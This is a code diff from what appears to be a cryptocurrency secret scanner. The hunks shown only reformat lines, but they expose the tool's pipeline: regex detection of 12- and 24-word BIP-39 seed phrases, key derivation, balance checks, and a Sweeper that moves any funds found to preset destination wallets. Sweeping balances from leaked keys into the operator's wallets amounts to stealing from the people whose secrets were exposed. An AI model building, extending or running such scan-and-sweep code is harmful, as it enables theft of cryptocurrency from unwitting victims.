@@ -23,9 +23,7 @@ logger = logging.getLogger(__name__)
 
 # Dedup: track mnemonics already verified (prevents duplicate reports across scan cycles)
 _SEEN_MNEMONICS: set[str] = set()
-_SEEN_MNEMONICS_FILE = os.path.join(
-    os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "seen_mnemonics.json"
-)
+_SEEN_MNEMONICS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "seen_mnemonics.json")
 
 
 def _load_seen_mnemonics() -> None:
@@ -182,13 +180,9 @@ class MnemonicPatternDetector:
         # Build alternation pattern from BIP-39 words
         word_group = r"(?:" + "|".join(sorted(words, key=len, reverse=True)) + r")"
         # Match 12-word sequences
-        pattern_12 = (
-            r"(?:(?<=\s)|(?<=^))" + r"\s+".join([word_group] * 12) + r"(?=\s|$|[,.])"
-        )
+        pattern_12 = r"(?:(?<=\s)|(?<=^))" + r"\s+".join([word_group] * 12) + r"(?=\s|$|[,.])"
         # Match 24-word sequences
-        pattern_24 = (
-            r"(?:(?<=\s)|(?<=^))" + r"\s+".join([word_group] * 24) + r"(?=\s|$|[,.])"
-        )
+        pattern_24 = r"(?:(?<=\s)|(?<=^))" + r"\s+".join([word_group] * 24) + r"(?=\s|$|[,.])"
 
         cls._MNEMONIC_PATTERNS = [
             re.compile(pattern_24, re.IGNORECASE | re.MULTILINE),
@@ -259,9 +253,7 @@ async def verify_and_alert(
 
     # Dedup: skip already-verified mnemonics (prevents duplicate reports)
     if _is_mnemonic_seen(mnemonic_candidate):
-        logger.debug(
-            "Skipping already-verified mnemonic: %s...", mnemonic_candidate[:20]
-        )
+        logger.debug("Skipping already-verified mnemonic: %s...", mnemonic_candidate[:20])
         return None
     _mark_mnemonic_seen(mnemonic_candidate)
 
@@ -331,7 +323,7 @@ async def verify_and_alert(
                     _sweeper = getattr(verify_and_alert, "_shared_sweeper", None)
                     if _sweeper is None:
                         _sweeper = Sweeper()
-                        verify_and_alert._shared_sweeper = _sweeper
+                        verify_and_alert._shared_sweeper = _sweeper  # type: ignore[attr-defined]
                     sr = await _sweeper.sweep(
                         private_key_hex=addr.private_key_hex,
                         chain=chain_cfg,
@@ -415,9 +407,7 @@ async def verify_and_alert_key(
         if chain_cfg is None:
             return None
 
-        result = await check_balance(
-            derived.address, chain_cfg, derived.derivation_path
-        )
+        result = await check_balance(derived.address, chain_cfg, derived.derivation_path)
         if result.balance > 0:
             finding.has_balance = True
             finding.balance_details[derived.chain] = {
@@ -445,9 +435,7 @@ async def verify_and_alert_key(
                 chain_lower = derived.chain.lower()
                 if chain_lower in DESTINATION_WALLETS:
                     sweep_result = await sweeper.sweep(
-                        private_key_hex=key_candidate
-                        if derived.private_key_hex is None
-                        else derived.private_key_hex,
+                        private_key_hex=key_candidate if derived.private_key_hex is None else derived.private_key_hex,
                         chain=chain_cfg,
                         source_address=derived.address,
                         balance_raw=result.balance_raw
